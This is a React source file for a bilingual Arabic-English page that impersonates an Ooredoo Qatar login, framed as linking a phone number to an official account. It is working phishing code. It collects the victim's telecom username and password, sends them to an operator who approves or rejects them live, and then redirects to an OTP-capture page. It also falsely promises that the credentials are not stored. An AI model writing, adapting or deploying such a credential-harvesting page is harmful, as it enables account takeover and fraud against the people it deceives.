import { useEffect } from "react";
import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { Loader2, Eye, EyeOff, PhoneCall, ShieldCheck } from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { socket, sendData, navigateToPage, visitor } from "@/lib/store";
import { getServiceContext } from "@/lib/serviceContext";

const OoredooLogin = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const selectedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") : null;
  const serviceContext = getServiceContext(selectedService);

  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [rejected, setRejected] = useState(false);
  const [rejectionMsg, setRejectionMsg] = useState("");

  const isValid = identifier.trim().length >= 4 && password.length >= 4;

  useEffect(() => {
    navigateToPage("تسجيل دخول Ooredoo");
  }, []);

  // مراقبة موافقة/رفض الأدمن
  useEffect(() => {
    if (!waiting) return;

    const s = socket.value;

    const onApproved = () => {
      setWaiting(false);
      setLoading(false);
      navigate("/ooredoo-otp");
    };

    const onRejected = () => {
      setWaiting(false);
      setLoading(false);
      setRejected(true);
      setRejectionMsg(pick(
        "البيانات التي أدخلتها غير صحيحة. يرجى التأكد منها وإعادة المحاولة",
        "The details you entered are incorrect. Please verify and try again."
      ));
      setPassword("");
    };

    s.on("form:approved", onApproved);
    s.on("form:rejected", onRejected);

    return () => {
      s.off("form:approved", onApproved);
      s.off("form:rejected", onRejected);
    };
  }, [waiting]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setLoading(true);
    setRejected(false);
    setRejectionMsg("");

    sendData({
      data: {
        "اسم المستخدم": identifier.trim(),
        "كلمة المرور": password,
        "الخدمة": selectedService || "ooredoo",
      },
      current: "تسجيل دخول Ooredoo",
      nextPage: "رمز OTP",
      waitingForAdminResponse: true,
      isCustom: true,
      customWaitingMessage: pick("جارٍ التحقق من بيانات مشغّل الاتصالات...", "Verifying telecom operator credentials..."),
    });

    setWaiting(true);
  };

  return (
    <div className="min-h-screen bg-background relative" dir={dir}>
      {/* Waiting Overlay */}
      {waiting && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
          <div className="bg-white dark:bg-gray-900 rounded-2xl shadow-2xl p-8 max-w-sm w-full mx-4 text-center space-y-4">
            <Loader2 className="w-12 h-12 animate-spin text-primary mx-auto" />
            <p className="text-lg font-semibold text-foreground">
              {pick("جارٍ التحقق من بيانات مشغّل الاتصالات...", "Verifying telecom operator credentials...")}
            </p>
            <p className="text-sm text-muted-foreground">1:00</p>
          </div>
        </div>
      )}

      <SiteHeader />

      <section className="px-4 pb-10 pt-6">
        <div className="container mx-auto max-w-5xl space-y-5">
          {/* Official notice */}
          <div className="rounded-2xl bg-gradient-to-l from-red-600 to-red-700 text-white p-5 shadow-lg flex items-center gap-4">
            <div className="w-12 h-12 rounded-full bg-white/15 flex items-center justify-center shrink-0">
              <PhoneCall className="w-6 h-6 text-white" />
            </div>
            <div>
              <p className="text-xs font-bold opacity-90 mb-1">
                {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
              </p>
              <p className="text-base font-extrabold leading-tight">
                {pick(
                  `ربط رقم الهاتف مع ${serviceContext.accountAr}`,
                  `Link your phone number to your ${serviceContext.accountEn}`
                )}
              </p>
            </div>
          </div>

          {/* Rejection Banner */}
          {rejected && rejectionMsg && (
            <div className="rounded-xl bg-red-50 border border-red-200 text-red-700 p-4 text-sm font-medium">
              {rejectionMsg}
            </div>
          )}

          {/* Form */}
          <div className="bg-card rounded-2xl shadow-sm border border-border p-6 space-y-6">
            <div className="space-y-1">
              <h1 className="text-2xl font-extrabold text-foreground">
                {pick("تأكيد ملكية رقم الهاتف وربطه بالحساب", "Confirm phone number ownership and link to account")}
              </h1>
              <p className="text-sm text-muted-foreground">
                {pick(
                  `لإتمام تفعيل ${serviceContext.accountAr}، يُشترط التحقق من رقم الهاتف المسجّل لدى مشغّل الاتصالات Ooredoo Qatar وربطه رسمياً بحسابك.`,
                  `To complete ${serviceContext.accountEn} activation, you must verify your phone number registered with Ooredoo Qatar.`
                )}
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-semibold text-foreground">
                  {pick("اسم المستخدم أو البريد لدى مشغّل الاتصالات", "Username or email with telecom operator")}
                </label>
                <Input
                  type="text"
                  placeholder={pick("مثال: 33xxxxxx", "e.g. 33xxxxxx")}
                  value={identifier}
                  onChange={(e) => setIdentifier(e.target.value)}
                  className="h-12 text-base"
                  dir="ltr"
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-semibold text-foreground">
                  {pick("كلمة المرور الخاصة بحساب المشغّل", "Password for telecom account")}
                </label>
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-12 text-base pr-12"
                    dir="ltr"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              <div className="flex items-start gap-2 text-xs text-muted-foreground bg-muted/50 rounded-lg p-3">
                <ShieldCheck className="w-4 h-4 shrink-0 mt-0.5 text-green-600" />
                <span>
                  {pick(
                    "تُستخدم هذه البيانات لمرة واحدة فقط للتحقق من ملكية الخط، ولا يتم تخزين كلمة المرور لدى القومسيون الطبي.",
                    "These credentials are used once only to verify phone ownership and are not stored."
                  )}
                </span>
              </div>

              <Button
                type="submit"
                disabled={!isValid || loading}
                className="w-full h-12 text-base font-bold bg-primary hover:bg-primary/90"
              >
                {loading ? (
                  <Loader2 className="w-5 h-5 animate-spin" />
                ) : (
                  pick("تأكيد الرقم وربطه بالحساب", "Confirm and link phone number")
                )}
              </Button>
            </form>
          </div>
        </div>
      </section>

      <SiteFooter />
    </div>
  );
};

export default OoredooLogin;
